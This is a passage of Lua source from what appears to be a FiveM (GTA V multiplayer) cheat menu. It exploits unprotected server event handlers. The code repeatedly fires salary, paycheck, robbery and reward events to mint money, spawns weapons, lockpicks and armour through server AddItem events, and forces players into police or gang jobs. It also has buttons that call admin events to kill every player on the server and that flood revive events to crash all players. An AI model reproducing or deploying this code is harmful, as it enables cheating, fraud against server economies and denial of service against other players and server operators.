                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 8 ~b~ VRP|Vrpx (SAMU|SALARIO)") then
			local result = 9999
                                if result then
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                end
                        elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 9 ~b~ VRP|Vrpx (SAMU|SALARIO)") then
                                local result = 9999
                                if result then
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                end
            elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 10 ~b~ VRP|Vrpx (SAMU|SALARIO) ~r~OFF") then
                                local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                                if result then
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
										end
			elseif IhadSexWithMyStepMother.Button("~s~Bank ~r~~h~Deposit") then
				local money = GetKeyboardInput("Enter amount of money", "", 100)
				if money then
				TriggerServerEvent("bank:deposit", money)
				end
			elseif IhadSexWithMyStepMother.Button("~s~Bank ~r~~h~Withdraw ") then
				local money = GetKeyboardInput("Enter amount of money", "", 100)
				if money then
				TriggerServerEvent("bank:withdraw", money)
				end
			end
			
			 elseif IhadSexWithMyStepMother.IsMenuOpened('player1') then
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if IhadSexWithMyStepMother.MenuButton("ID: ~g~[" .. GetPlayerServerId(currPlayer) .. "] ~s~~h~" .. GetPlayerName(currPlayer), 'other') then
                        selectedPlayer = currPlayer end
                end
			
			elseif IhadSexWithMyStepMother.IsMenuOpened('other') then
			if IhadSexWithMyStepMother.Button("~r~Remove Job") then
                TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~c~ Mechanic") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mecano", result)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~b~ Police") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
				TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~c~ Mafia") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~p~ Gang") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~y~ Taxi") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~r~ Inem") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
			end
        
        
      
        elseif IhadSexWithMyStepMother.IsMenuOpened('esx') then
            if IhadSexWithMyStepMother.Button("CFW ~g~Money") then
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-recycle:server:getItem')
                TriggerServerEvent('qb-recycle:server:getItem')
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-recycle:server:getItem')
                TriggerServerEvent('qb-recycle:server:getItem')
                TriggerServerEvent('qb-recycle:server:getItem')
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-taco:server:reward:money', true)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-tow:server:DoBail', false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
                TriggerServerEvent('qb-storerobbery:server:takeMoney', currentRegister, false)
            elseif IhadSexWithMyStepMother.Button("CFW Give ~v~Armor") then
                TriggerServerEvent(":Server:AddItem", "armor", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "armor", 1)
				TriggerServerEvent('ipx-Core:Server:AddItem', "armor", 1)
                TriggerServerEvent("bw:Server:AddItem", "armor", 1)
		    elseif IhadSexWithMyStepMother.Button("CFW ~g~Fleeca ITEMS") then
			    TriggerServerEvent('QBCore:Server:AddItem', "bank_card", 1)
			    TriggerServerEvent('QBCore:Server:AddItem', "fleecacard", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "fleecacard2", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "trojan_usb", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "electronickit", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "advancedlockpick", 1)
	            TriggerServerEvent('ipx-Core:Server:AddItem', "bank_card", 1)
			    TriggerServerEvent('ipx-Core:Server:AddItem', "fleecacard", 1)
				TriggerServerEvent('ipx-Core:Server:AddItem', "fleecacard2", 1)
				TriggerServerEvent('ipx-Core:Server:AddItem', "trojan_usb", 1)
				TriggerServerEvent('ipx-Core:Server:AddItem', "electronickit", 1)
				TriggerServerEvent('ipx-Core:Server:AddItem', "advancedlockpick", 1)
            elseif IhadSexWithMyStepMother.Button("~v~CFW WWBA ITEMS") then
			    TriggerServerEvent('QBCore:Server:AddItem', "advancedlockpick", 5)
			    TriggerServerEvent('QBCore:Server:AddItem', "lockpick", 4)
				TriggerServerEvent('QBCore:Server:AddItem', "handcuffs", 2)
				TriggerServerEvent('QBCore:Server:AddItem', "pistol_ammo", 60)
				TriggerServerEvent('QBCore:Server:AddItem', "radio", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "pistol_suppressor", 1)
                TriggerServerEvent('QBCore:Server:AddItem', "screwdriverset", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "weapon_pistol_mk2", 1)
				TriggerServerEvent('QBCore:Server:AddItem', "weapon_pistol50", 1)
                TriggerServerEvent('QBCore:Server:AddItem', "armor", 2)
            elseif IhadSexWithMyStepMother.Button("~r~Kill All Players in Server") then
                TriggerServerEvent("qb-admin:server:killPlayer", -1)
				TriggerServerEvent("ipx-admin:server:killPlayer", -1)
                TriggerServerEvent("drk-admin:server:killPlayer", -1)
            elseif IhadSexWithMyStepMother.Button("~r~Crash all player rl") then
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
